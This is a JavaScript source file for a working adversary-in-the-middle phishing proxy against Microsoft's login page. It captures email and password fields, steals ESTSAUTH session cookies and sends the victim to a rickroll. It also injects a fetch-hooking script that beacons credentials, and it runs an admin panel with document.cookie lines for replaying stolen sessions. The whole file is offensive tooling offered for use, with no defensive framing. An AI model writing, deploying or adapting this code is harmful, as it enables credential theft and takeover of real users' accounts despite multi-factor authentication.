const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const fs = require('fs');
const zlib = require('zlib');

const app = express();
const PORT = process.env.PORT || 3000;
const RICKROLL = 'https://archive.org/details/MacArthur_Foundation_100andChange_dQw4w9WgXcQ';

const CAPTURES_FILE = './captures.json';
if (!fs.existsSync(CAPTURES_FILE)) fs.writeFileSync(CAPTURES_FILE, '[]');

let stolenSession = null; // Store the hijacked session

function saveCapture(type, data) {
    const capture = { timestamp: new Date().toISOString(), type, ...data };
    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
    captures.push(capture);
    fs.writeFileSync(CAPTURES_FILE, JSON.stringify(captures, null, 2));
    
    console.log(`\n[${type.toUpperCase()}] ${capture.timestamp}`);
    if (data.email) console.log(`  Email: ${data.email}`);
    if (data.password) console.log(`  Password: ${data.password}`);
    if (data.sessionTokens) console.log(`  Session stolen: ${data.sessionTokens.length} tokens`);
}

// Parse body
app.use(express.raw({ type: '*/*', limit: '50mb' }));

const proxy = createProxyMiddleware({
    target: 'https://login.microsoftonline.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    followRedirects: true,
    
    onProxyReq: (proxyReq, req, res) => {
        const bodyStr = req.body?.toString?.() || '';
        
        // Capture Microsoft credentials (loginfmt/passwd)
        if (req.method === 'POST') {
            try {
                const params = new URLSearchParams(bodyStr);
                const email = params.get('loginfmt');
                const password = params.get('passwd');
                
                if (email) {
                    saveCapture('credentials', { 
                        email, 
                        password,
                        ip: req.headers['x-forwarded-for'] || req.ip,
                        url: req.url
                    });
                    console.log(`[+] Credentials captured for ${email}`);
                }
            } catch(e) {}
        }
        
        if (req.body?.length > 0) {
            proxyReq.write(req.body);
        }
        proxyReq.end();
    },
    
    onProxyRes: (proxyRes, req, res) => {
        let body = [];
        proxyRes.on('data', chunk => body.push(chunk));
        proxyRes.on('end', () => {
            let buffer = Buffer.concat(body);
            const encoding = proxyRes.headers['content-encoding'];
            
            if (encoding === 'gzip') {
                try { buffer = zlib.gunzipSync(buffer); } catch(e) {}
            } else if (encoding === 'deflate') {
                try { buffer = zlib.inflateSync(buffer); } catch(e) {}
            }
            
            const bodyStr = buffer.toString();
            const contentType = proxyRes.headers['content-type'] || '';
            
            // Check for session cookies (the gold)
            const cookies = proxyRes.headers['set-cookie'];
            if (cookies) {
                const estaAuth = cookies.find(c => c.includes('ESTSAUTH='));
                const estaLight = cookies.find(c => c.includes('ESTSAUTHLIGHT='));
                const sessionId = cookies.find(c => c.includes('sessionId='));
                
                // Save the session for ourselves
                if (estaAuth || estaLight) {
                    stolenSession = {
                        estaAuth,
                        estaLight,
                        sessionId,
                        allCookies: cookies,
                        capturedAt: new Date().toISOString()
                    };
                    
                    saveCapture('session_hijack', {
                        email: 'see previous credential log',
                        sessionTokens: cookies.filter(c => !c.includes('fpc=') && !c.includes('esctx=')), // Filter junk
                        estaAuth: estaAuth ? estaAuth.substring(0, 50) + '...' : null,
                        fullCapture: true
                    });
                    
                    console.log('[+] SESSION HIJACKED - Victim will be rickrolled');
                    
                    // Send rickroll instead of the success response
                    res.statusCode = 302;
                    res.setHeader('Location', RICKROLL);
                    res.setHeader('Set-Cookie', cookies); // Actually give them the cookies so they think it worked briefly?
                    // Actually no - don't give them the session, just rickroll
                    res.end();
                    return;
                }
            }
            
            if (proxyRes.statusCode === 302 || proxyRes.statusCode === 301) {
                const location = proxyRes.headers['location'] || '';
                if (location.includes('outlook') || location.includes('office') || location.includes('microsoft365')) {
                    console.log('[+] Blocking redirect to Microsoft services, sending to rickroll');
                    res.statusCode = 302;
                    res.setHeader('Location', RICKROLL);
                    res.end();
                    return;
                }
            }
            
            // Inject credential capture script
            if (contentType.includes('text/html')) {
                const injection = `
                <script>
                (function(){
                    const origFetch = window.fetch;
                    window.fetch = function(url, opts) {
                        if (opts?.body && opts.body.toString().includes('loginfmt')) {
                            navigator.sendBeacon('/capture-js', opts.body);
                        }
                        return origFetch.apply(this, arguments);
                    };
                })();
                </script>`;
                
                if (bodyStr.includes('</head>')) {
                    buffer = Buffer.from(bodyStr.replace('</head>', injection + '</head>'));
                }
            }
            
            // Send response (but strip sensitive cookies if we want to be evil)
            if (encoding === 'gzip') buffer = zlib.gzipSync(buffer);
            else if (encoding === 'deflate') buffer = zlib.deflateSync(buffer);
            
            res.status(proxyRes.statusCode);
            Object.keys(proxyRes.headers).forEach(key => {
                // Don't forward Set-Cookie if we stole the session (optional - uncomment to block their login)
                // if (key === 'set-cookie' && stolenSession) return;
                if (key !== 'content-length') res.setHeader(key, proxyRes.headers[key]);
            });
            res.end(buffer);
        });
    }
});

// JS capture
app.post('/capture-js', express.text(), (req, res) => {
    try {
        const params = new URLSearchParams(req.body);
        const email = params.get('loginfmt');
        const pass = params.get('passwd');
        if (email) {
            saveCapture('credentials', { email, password: pass, source: 'xhr' });
        }
    } catch(e) {}
    res.sendStatus(200);
});

// Admin panel showing stolen sessions
app.get('/admin', (req, res) => {
    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
    const creds = captures.filter(c => c.email);
    const sessions = captures.filter(c => c.sessionTokens);
    
    // Build session use instructions
    let sessionHtml = '';
    if (stolenSession) {
        sessionHtml = `
        <div style="background:#222; border:2px solid #0f0; padding:15px; margin:10px 0;">
            <h3 style="color:#0f0;">ACTIVE STOLEN SESSION</h3>
            <p>Copy these cookies into your browser to log in as victim:</p>
            <textarea style="width:100%; height:150px; background:#000; color:#0f0; font-family:monospace;">
document.cookie = "${stolenSession.estaAuth?.split(';')[0] || 'ESTSAUTH=...'}";
document.cookie = "${stolenSession.estaLight?.split(';')[0] || 'ESTSAUTHLIGHT=...'}";
location.reload();
            </textarea>
            <p style="color:#888; font-size:12px;">Captured: ${stolenSession.capturedAt}</p>
        </div>`;
    }
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>AiTM Control</title>
        <style>
            body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
            .cred { background: #1a1a1a; border-left: 3px solid #f00; padding: 10px; margin: 10px 0; }
            .session { background: #1a1a1a; border-left: 3px solid #0f0; padding: 10px; margin: 10px 0; }
            h1 { color: #fff; }
            .stats { background: #222; padding: 15px; margin: 10px 0; border-radius: 5px; }
            button { background: #333; color: #fff; border: 1px solid #555; padding: 10px; cursor: pointer; }
            button:hover { background: #444; }
            code { background: #000; padding: 2px 5px; color: #ff0; }
        </style>
    </head>
    <body>
        <h1>AiTM Control Panel</h1>
        <div class="stats">
            <strong>Credentials:</strong> ${creds.length} | 
            <strong>Sessions:</strong> ${sessions.length} | 
            <strong>Last Capture:</strong> ${captures[captures.length-1]?.timestamp || 'None'}
        </div>
        
        ${sessionHtml}
        
        <h3>Captured Credentials:</h3>
        ${creds.reverse().map(c => `
            <div class="cred">
                <div style="color:#f00; font-size:18px;"><strong>${c.email}</strong></div>
                <div style="color:#ff6600;">Password: ${c.password}</div>
                <div style="color:#888; font-size:11px;">${c.timestamp} | ${c.ip}</div>
            </div>
        `).join('') || '<p style="color:#666;">No credentials yet...</p>'}
        
        <hr>
        <button onclick="fetch('/clear',{method:'POST'}).then(()=>location.reload())">Clear All Data</button>
        <button onclick="fetch('/steal-session',{method:'POST'}).then(r=>r.json()).then(d=>alert(JSON.stringify(d,null,2)))">Test Session</button>
    </body>
    </html>
    `);
});

// Endpoint to get current stolen session
app.get('/steal-session', (req, res) => {
    res.json(stolenSession || { error: 'No session captured yet' });
});

app.post('/clear', (req, res) => {
    stolenSession = null;
    fs.writeFileSync(CAPTURES_FILE, '[]');
    res.json({ cleared: true });
});

app.get('/health', (req, res) => res.json({ status: 'AiTM active' }));

// Apply proxy
app.use((req, res, next) => {
    if (req.path.match(/^\/(admin|capture-js|clear|health|steal-session)/)) next();
    else proxy(req, res, next);
});

app.listen(PORT, () => {
    console.log(`[+] AiTM Proxy running on port ${PORT}`);
    console.log(`[+] Admin: http://localhost:${PORT}/admin`);
    console.log(`[+] Rickroll: ${RICKROLL}`);
});
